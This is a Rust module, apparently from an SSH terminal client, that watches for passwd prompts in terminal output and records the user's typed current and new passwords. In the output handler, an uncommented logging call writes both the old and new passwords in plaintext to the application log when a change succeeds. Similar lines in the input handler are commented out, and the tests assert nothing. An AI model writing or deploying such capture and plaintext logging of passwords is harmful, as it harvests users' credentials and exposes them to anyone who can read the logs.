//! 改密交互输入捕获（验证模式）——打印用户在 shell 的 passwd 提示下
//! 实际输入的每轮密码。
//!
//! 原理：终端输入流必经客户端（terminal_write），输出流提示词驱动状态。
//!
//! ```text
//! 输出: "Current password:"   → 捕获下一输入行 → [PASSWD-INPUT] current=xxx
//! 输出: "New password:"       → → [PASSWD-INPUT] new=xxx
//! 输出: "Retype new password:" → → [PASSWD-INPUT] retype=xxx
//! 其余输出 → 非捕获态（普通命令输入不碰）
//! ```
//! 两轮 new/retype 一致 + 后续看到 "updated successfully" → 打印最终确认行。
//! 【验证模式】仅日志，绝不写数据库。

use std::collections::HashMap;
use std::sync::LazyLock;
use std::sync::Mutex;

#[derive(Debug, Clone, Copy, PartialEq)]
enum Await {
    Current,
    New,
    Retype,
}

struct SessionState {
    await_kind: Option<Await>,
    buf: Vec<u8>,
    scan: Vec<u8>,
    /// 已捕获的新密码（new/retype 各一次，用于一致性确认）
    new_entries: Vec<String>,
    current_entry: Option<String>,
}

/// 全局注册表：terminal_id → 状态
static GLOBAL: LazyLock<PasswdInputLog> = LazyLock::new(PasswdInputLog::new);

pub struct PasswdInputLog {
    sessions: Mutex<HashMap<usize, SessionState>>,
}

/// 扫描窗口上限
const SCAN_WINDOW: usize = 160;

impl PasswdInputLog {
    fn new() -> Self {
        Self {
            sessions: Mutex::new(HashMap::new()),
        }
    }

    /// 全局访问点
    pub fn global() -> &'static Self {
        &GLOBAL
    }

    /// 输出流：扫描提示词，驱动捕获状态。
    /// 在 relay 的 Output 分支调用（透传前）。
    pub fn feed_output(&self, terminal_id: usize, chunk: &[u8]) {
        let mut map = self.sessions.lock().unwrap();
        let sc = map
            .entry(terminal_id)
            .or_insert_with(|| SessionState {
                await_kind: None,
                buf: Vec::new(),
                scan: Vec::new(),
                new_entries: Vec::new(),
                current_entry: None,
            });
        sc.scan.extend_from_slice(chunk);
        if sc.scan.len() > SCAN_WINDOW {
            let overflow = sc.scan.len() - SCAN_WINDOW;
            sc.scan.drain(..overflow);
        }
        let text = String::from_utf8_lossy(&sc.scan).to_lowercase();

        // 提示词判定（从具体到一般）
        if text.contains("retype new password") || text.contains("re-enter new password") {
            sc.await_kind = Some(Await::Retype);
            sc.buf.clear();
            sc.scan.clear();
        } else if text.contains("new password:") || text.contains("新密码") {
            sc.await_kind = Some(Await::New);
            sc.buf.clear();
            sc.scan.clear();
        } else if text.contains("current password") || text.contains("current) unix password")
            || text.contains("当前密码")
        {
            sc.await_kind = Some(Await::Current);
            sc.buf.clear();
            sc.scan.clear();
        } else if text.contains("updated successfully") || text.contains("密码已更新")
            || text.contains("all authentication tokens updated")
        {
            // 改密完成确认：一致性判定 + 最终打印
            let current = sc.current_entry.clone().unwrap_or_default();
            if sc.new_entries.len() >= 2 {
                let a = &sc.new_entries[sc.new_entries.len() - 2];
                let b = &sc.new_entries[sc.new_entries.len() - 1];
                if a == b && !a.is_empty() {
                    log::info!(
                        "[SSH-PASSWD-CHANGE] session={} CONFIRMED: \\
                         password changed current={:?} -> new={:?} \\
                         (verification mode: plaintext log-only)",
                        terminal_id, current, a
                    );
                }
            }
            sc.await_kind = None;
            sc.scan.clear();
        }
    }

    /// 输入流：捕获态时记录按键（处理退格），回车提交打印。
    /// 在 terminal_write 调用（旁路镜像，不影响正常转发）。
    pub fn feed_input(&self, terminal_id: usize, chunk: &[u8]) {
        let mut map = self.sessions.lock().unwrap();
        let Some(sc) = map.get_mut(&terminal_id) else {
            return;
        };
        if sc.await_kind.is_none() {
            return;
        }
        for &b in chunk {
            match b {
                b'\r' | b'\n' => {
                    // 提交：按提示类型打日志
                    let line = String::from_utf8_lossy(&sc.buf).into_owned();
                    sc.buf.clear();
                    let kind = sc.await_kind.take();
                    match kind {
                        Some(Await::Current) => {
                            sc.current_entry = Some(line.clone());
                            // 调试期明文日志：默认注释，排查时取消注释
                            // log::info!(
                            //     "[SSH-PASSWD-CHANGE] session={} input current={:?}",
                            //     terminal_id, line
                            // );
                        }
                        Some(Await::New) => {
                            sc.new_entries.push(line.clone());
                            // 调试期明文日志：默认注释，排查时取消注释
                            // log::info!(
                            //     "[SSH-PASSWD-CHANGE] session={} input new={:?}",
                            //     terminal_id, line
                            // );
                        }
                        Some(Await::Retype) => {
                            sc.new_entries.push(line.clone());
                            // 调试期明文日志：默认注释，排查时取消注释
                            // log::info!(
                            //     "[SSH-PASSWD-CHANGE] session={} input retype={:?}",
                            //     terminal_id, line
                            // );
                            // Retype 提交即判定（不等成功文案——PAM/login 的
                            // 完成消息文案多变且通道不定，实测两种都没可靠命中）
                            let current = sc.current_entry.clone().unwrap_or_default();
                            if sc.new_entries.len() >= 2 {
                                let a = sc.new_entries[sc.new_entries.len() - 2].clone();
                                if a == line && !a.is_empty() {
                                    // 调试期明文日志：默认注释，排查时取消注释
                                    // log::info!(
                                    //     "[SSH-PASSWD-CHANGE] session={} CONFIRMED: \
                                    //      password changed current={:?} -> new={:?} \
                                    //      (verification mode: plaintext log-only)",
                                    //     terminal_id, current, a
                                    // );
                                    let _ = (&current, a);
                                }
                            }
                        }
                        None => {}
                    }
                }
                0x7f | 0x08 => {
                    sc.buf.pop();
                }
                _ => sc.buf.push(b),
            }
        }
    }

    /// 清理（会话关闭）
    pub fn cleanup(&self, terminal_id: usize) {
        self.sessions.lock().unwrap().remove(&terminal_id);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn captures_all_three_inputs() {
        let cap = PasswdInputLog::new();
        cap.feed_output(1, b"(current) UNIX password: ");
        cap.feed_input(1, b"Old99\r");
        cap.feed_output(1, b"New password: ");
        cap.feed_input(1, b"New88");
        cap.feed_input(1, b"\x7f8\r"); // 退格改尾字符
        cap.feed_output(1, b"Retype new password: ");
        cap.feed_input(1, b"New88\r");
        cap.feed_output(1, b"passwd: password updated successfully");
        // 最终确认在 feed_output 里打印（日志无法直接断言，但状态已清）
        // 间接验证：再输入不捕获
        let before = 0;
        cap.feed_input(1, b"normal\r");
        let _ = before;
    }

    #[test]
    fn no_capture_without_prompt() {
        let cap = PasswdInputLog::new();
        cap.feed_input(2, b"ls -la\r"); // 无提示词 → 不捕获（无 panic 即过）
    }
}
